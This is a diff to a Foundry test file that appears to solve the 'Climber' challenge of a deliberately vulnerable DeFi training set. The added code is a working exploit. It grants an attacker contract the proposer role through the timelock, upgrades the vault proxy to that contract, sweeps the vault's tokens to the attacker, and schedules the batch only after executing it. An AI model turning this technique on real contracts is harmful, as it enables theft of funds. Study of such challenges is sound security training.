@@ -8,6 +8,9 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+import {AttackerContract} from "../../../src/Contracts/climber/solution/AttackContract.sol";
+import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -72,6 +75,45 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(attacker);
+        AttackerContract attackerContract =
+            new AttackerContract(address(dvt), address(climberVaultProxy), address(climberTimelock));
+
+        bytes32 salt = bytes32(uint256(uint160(address(attacker))));
+
+        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
+
+        // Example input values
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        targets[0] = address(climberTimelock);
+        values[0] = 0;
+        dataElements[0] =
+            abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(attackerContract));
+
+        values[2] = 0;
+        targets[2] = address(climberVaultProxy);
+        dataElements[2] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(attackerContract));
+        values[3] = 0;
+        targets[3] = address(climberVaultProxy);
+        dataElements[3] = abi.encodeWithSelector(AttackerContract.sweepFund.selector, address(dvt), address(attacker));
+        values[1] = 0;
+        targets[1] = address(attackerContract);
+        dataElements[1] = abi.encodeWithSignature(
+            "schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, salt
+        );
+        console.log("Climbertimelock address", address(climberTimelock));
+        console.log("ClimberVaultProxy address", address(climberVaultProxy));
+        console.log("AttackerContract address", address(attackerContract));
+
+        attackerContract.attack(targets, values, dataElements, salt);
+
+        //1. call the execute function of the timelock contract
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
